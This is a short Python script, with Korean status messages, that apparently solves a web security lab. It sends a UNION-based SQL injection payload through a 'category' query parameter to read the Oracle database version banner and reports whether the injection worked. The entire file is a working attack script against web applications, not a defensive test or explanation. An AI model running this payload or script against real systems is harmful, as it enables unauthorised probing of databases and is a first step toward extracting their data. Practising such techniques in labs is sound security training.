import requests
import re

def send_request(url, payload):
    params = {"category": payload}
    res = requests.get(url, params=params)
    return res.text

def run_union(url):
    print("\n[UNION SQL Injection 테스트 시작]\n")

    payload = "' UNION SELECT banner, NULL FROM v$version--"

    res = send_request(url, payload)

    print("[응답 분석 중...]")

    if "Oracle" in res:
        print("▶ Oracle 데이터베이스 탐지됨")

    matches = re.findall(r"Oracle.*", res)

    if matches:
        print("\n[버전 정보]")
        for m in matches:
            print(m)
        print("\n🔥 UNION 기반 SQL Injection 성공")
    else:
        print("❌ 버전 정보 탐지 실패")